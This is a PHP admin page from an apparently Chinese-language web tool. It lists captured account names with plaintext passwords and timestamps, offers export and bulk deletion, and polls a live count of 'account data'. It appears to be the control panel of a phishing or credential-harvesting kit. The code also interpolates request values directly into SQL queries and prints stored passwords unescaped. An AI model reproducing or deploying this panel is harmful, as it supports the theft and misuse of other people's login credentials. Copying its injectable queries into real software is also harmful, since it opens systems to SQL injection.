<?php
$mod='blank';
include("../includes/common.php");
$title='后台首页';
include './head.php';
if($islogin==1){}else exit("<script language='javascript'>window.location.href='./login.php';</script>");
?>
  <nav class="navbar navbar-fixed-top navbar-default">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
          <span class="sr-only">导航按钮</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="./">后台管理</a>
      </div><!-- /.navbar-header -->
      <div id="navbar" class="collapse navbar-collapse">
        <ul class="nav navbar-nav navbar-right">
          <li class="active">
            <a href="./"><span class="glyphicon glyphicon-user"></span> 数据列表</a>
          </li>
          <li>
            <a href="./set.php"><span class="glyphicon glyphicon-user"></span> 网站设置</a>
          </li>
          <li><a href="./login.php?logout"><span class="glyphicon glyphicon-log-out"></span> 退出登陆</a></li>
        </ul>
      </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
  </nav><!-- /.navbar -->
  <div class="container" style="padding-top:70px;">
    <div class="col-xs-12 col-sm-10 center-block" style="float: none;">
<?php
$my=isset($_GET['my'])?$_GET['my']:null;

// if($my=='add')
// {
// 	if($url = $_GET['url']){
// 		$url = parse_url($url);
// 		$url = $url['host'];
// 	}
// echo '<div class="panel panel-primary">
// <div class="panel-heading"><h3 class="panel-title">添加记录</h3></div>';
// echo '<div class="panel-body">';
// echo '<form action="./index.php?my=add_submit" method="POST">
// <div class="form-group">
// <label>域名:</label>(不要加http://和/)<br>
// <input type="text" class="form-control" name="domain" value="'.@$url.'" required>
// </div>
// <div class="form-group">
// <label>类型:</label><br>
// <select class="form-control" name="type"><option value="2">黑名单</option><option value="1">白名单</option></select>
// </div>
// <input type="submit" class="btn btn-primary btn-block" value="确定添加"></form>';
// echo '<br/><a href="./index.php">>>返回记录列表</a>';
// echo '</div></div>';
// }
// elseif($my=='add_submit')
// {
// $domain=$_POST['domain'];
// $type=$_POST['type'];
// if($domain==NULL or $type==NULL){
//   showmsg('保存错误,请确保每项都不为空!',3);
// } else {
//   $sql="insert into `frame_list` (`domain`,`date`,`type`) values ('".$domain."','".$date."','".$type."')";
//   if($DB->query($sql)){
//   	showmsg('添加'.($type==2?'黑名单':'白名单').'成功！<br/><br/><a href="./index.php">>>返回列表</a>',1);
//   }else
//   	showmsg('添加'.($type==2?'黑名单':'白名单').'失败！'.$DB->error(),4);
//   }
// }

//单个删除
if($my=='del'){
$id=intval($_GET['id']);
$sql=$DB->query("DELETE FROM frame_list WHERE id='$id'");
if($sql){$res='删除成功！';}
  else{$res='删除失败！';}
  exit("<script language='javascript'>alert('{$res}');history.go(-1);</script>");
}

// 删除选中
elseif($my=='del2'){
$checkbox=$_POST['checkbox'];
$i=0;
foreach($checkbox as $id){
	$DB->query("DELETE FROM frame_list WHERE id='$id'");
	$i++;
}
exit("<script language='javascript'>alert('成功删除{$i}条记录');history.go(-1);</script>");
}

//清空所有
elseif($my=='qk'){
  $sql=$DB->query("DELETE FROM frame_list");
  if($sql){$res='删除成功！';}
  else{$res='删除失败！';}
  exit("<script language='javascript'>alert('{$res}');history.go(-1);</script>");

}




//默认列表
else{

if(isset($_GET['kw'])) {
	if($_GET['type']==1) {
		$sql=" `domain`='{$_GET['kw']}'";
		$numrows=$DB->count("SELECT count(*) from frame_list WHERE{$sql}");
		$con='包含 '.$_GET['kw'].' 的共有 <b>'.$numrows.'</b> 个记录';
	}
}else{
	$numrows=$DB->count("SELECT count(*) from frame_list WHERE 1");
	$sql=" 1";
	$con='系统共有 <b id="data-num">'.$numrows.'</b> 条账号数据&nbsp;';
}
$con.='<a href="./export.php" class="btn btn-primary btn-sm">导出列表</a>&nbsp;&nbsp;<a href="./index.php?my=qk" class="btn btn btn-danger btn-sm" onclick="return confirm(\'你确实要删除所有记录吗？\');">清空所有</a>&nbsp;&nbsp;<button id="auto-update" type="button" class="btn btn-primary" data-toggle="button" aria-pressed="false" autocomplete="off" data-complete-text="停止更新">自动更新</button>';
echo $con;
?>
      <div class="table-responsive">
	  <form name="form1" method="post" action="index.php?my=del2">
        <table class="table table-striped">
          <thead><tr><th>账号</th><th>密码</th><th>时间</th><th>操作</th></tr></thead>
          <tbody>
<?php
$pagesize=30;
$pages=intval($numrows/$pagesize);
if ($numrows%$pagesize)
{
 $pages++;
 }
if (isset($_GET['page'])){
$page=intval($_GET['page']);
}
else{
$page=1;
}
$offset=$pagesize*($page - 1);

$rs=$DB->query("SELECT * FROM frame_list WHERE{$sql} order by id desc limit $offset,$pagesize");
while($res = $DB->fetch($rs))
{
echo '<tr><td><input type="checkbox" name="checkbox[]" value="'.$res['id'].'"> '.htmlspecialchars($res['user']).'</td><td>'.($res['pass']).'</td><td>'.$res['date'].'</td><td><a href="./index.php?my=del&id='.$res['id'].'" class="btn btn-xs btn-danger" onclick="return confirm(\'你确实要删除此记录吗？\');">删除</a></td></tr>';
}
?>
          </tbody>
        </table>
<input type="submit" name="Submit" value="删除选中">
</form>
      </div>
<?php
echo'<ul class="pagination">';
$first=1;
$prev=$page-1;
$next=$page+1;
$last=$pages;
if ($page>1)
{
echo '<li><a href="index.php?page='.$first.$link.'">首页</a></li>';
echo '<li><a href="index.php?page='.$prev.$link.'">&laquo;</a></li>';
} else {
echo '<li class="disabled"><a>首页</a></li>';
echo '<li class="disabled"><a>&laquo;</a></li>';
}
for ($i=1;$i<$page;$i++)
echo '<li><a href="index.php?page='.$i.$link.'">'.$i .'</a></li>';
echo '<li class="disabled"><a>'.$page.'</a></li>';
for ($i=$page+1;$i<=$pages;$i++)
echo '<li><a href="index.php?page='.$i.$link.'">'.$i .'</a></li>';
echo '';
if ($page<$pages)
{
echo '<li><a href="index.php?page='.$next.$link.'">&raquo;</a></li>';
echo '<li><a href="index.php?page='.$last.$link.'">尾页</a></li>';
} else {
echo '<li class="disabled"><a>&raquo;</a></li>';
echo '<li class="disabled"><a>尾页</a></li>';
}
echo'</ul>';
#分页
}
?>
    </div>
  </div>
  <script type="text/javascript">
  var timer = '';
  $('#auto-update').on('click', function() {
     if($(this).attr('aria-pressed') == 'false') {
          timer = setInterval(function() {
          $.get('./getnum.php', function(data) {
            if(data)
              $('#data-num').text(data);
            else
              console.log('请求失败')
          });      
        }, 10000);
        $(this).button('complete');      
      }else {
        clearInterval(timer);
        $(this).button('reset');
      }
  })

  </script>
  </body>
</html>